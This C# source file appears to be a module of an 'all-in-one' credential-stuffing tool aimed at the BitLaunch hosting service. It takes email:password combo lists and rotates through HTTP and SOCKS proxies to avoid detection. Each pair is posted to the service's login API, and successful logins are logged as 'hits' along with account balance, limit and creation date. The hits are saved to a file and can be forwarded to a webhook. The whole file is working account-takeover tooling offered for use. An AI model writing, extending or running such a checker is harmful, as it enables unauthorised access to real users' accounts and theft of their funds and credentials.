using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Bitlaunchmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str = "{\"email\":\"" + array[0] + "\",\"password\":\"" + array[1] + "\"}";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post("https://app.bitlaunch.io/api/auth", str, "application/json")
                                .ToString();
                            {
                                if (strResponse.Contains("username or password is incorrect"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("{\"id\"") || strResponse.Contains("\"token\"")) //hit
                                {
                                    var createdat = Parse(strResponse, "created\":\"", "\"");
                                    var emailconmfitmerd = Parse(strResponse, "emailConfirmed\":", ",\"");
                                    var limit = Parse(strResponse, "limit\":", ",\"");
                                    var bal = Parse(strResponse, "balance\":", ",\"");
                                    var captures = " | Created at: " + createdat + " | Email Confirmed: " +
                                                   emailconmfitmerd + " | Limit: " + limit + " | Balance: " + bal;
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Bitlaunch_hits", array[0] + ":" + array[1] + captures);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Bitlaunch", array[0] + ":" + array[1] + captures);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Bitlaunch Hits");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}